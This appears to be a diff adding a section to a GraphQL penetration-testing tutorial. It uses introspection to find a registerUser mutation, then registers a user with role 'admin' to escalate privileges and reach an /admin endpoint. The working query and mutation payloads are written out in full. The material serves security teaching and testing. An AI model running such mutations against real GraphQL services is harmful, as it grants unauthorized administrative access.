@@ -359,4 +359,61 @@ fragment TypeRef on __Type {
   }
 }
 ```
+- From the result, we can identify a mutation registerUser, presumably allowing us to create new users. The mutation requires a RegisterUserInput object as an input:
 
+[mutation](/images/mutation.jpg)
+
+- We can now query all fields of the RegisterUserInput object with the following introspection query to obtain all fields that we can use in the mutation:
+```graphql
+{   
+  __type(name: "RegisterUserInput") {
+    name
+    inputFields {
+      name
+      description
+      defaultValue
+    }
+  }
+}
+```
+- From the result, we can identify that we can provide the new user's username, password, role, and msg:
+
+[mutation2](/images/mutation_2.png)
+
+- We can now finally register a new user by running the mutation:
+```graphql
+mutation {
+  registerUser(input: {username: "vautia", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "user", msg: "newUser"}) {
+    user {
+      username
+      password
+      msg
+      role
+    }
+  }
+}
+```
+
+- The result contains the fields we queried in the mutation's body so that we can check for errors:
+
+[mutation3](/images/mutation_3.png)
+
+### Exploitation with Mutations
+- To identify potential attack vectors through mutations, we need to thoroughly examine all supported mutations and their inputs. In this case, we can provide the role argument for newly registered users, which might enable us to create users with a different role than the default role, potentially allowing us to escalate privileges.
+- We have identified the roles user and admin from querying all existing users. Let us create a new user with the role admin and check if this enables us to access the internal admin endpoint at /admin. We can use the following GraphQL mutation:
+
+```graphql
+mutation {
+  registerUser(input: {username: "vautiaAdmin", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "admin", msg: "Hacked!"}) {
+    user {
+      username
+      password
+      msg
+      role
+    }
+  }
+}
+```
+- In the result, we can see that the role admin is reflected, which indicates that the attack was successful:
+
+[mutation4](/images/mutation_4.png)
